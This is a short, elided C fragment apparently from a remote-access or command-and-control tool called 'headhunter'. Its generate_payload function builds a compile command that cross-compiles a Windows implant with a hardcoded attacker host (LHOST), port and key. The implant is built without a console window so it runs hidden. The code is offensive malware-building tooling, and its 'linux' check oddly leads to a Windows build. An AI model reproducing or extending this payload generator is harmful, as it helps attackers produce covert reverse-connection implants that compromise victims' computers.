...
int generate_payload(char* platform, char* outfile, char* port, char* lhost, char* format) { 
	...
	if(strcmp(platform, "linux") == 0)
		...
		snprintf(cmd, CMD_SIZE, "x86_64-w64-mingw32-gcc /usr/lib/headhunter/payload/windows.c /usr/lib/headhunter/payload/headhunter.res -fPIC -D PORT=%s -D LHOST='\"%s\"' -D KEY='\"%s\"' -o %s -lws2_32 -mwindows", port, lhost, key, outfile);
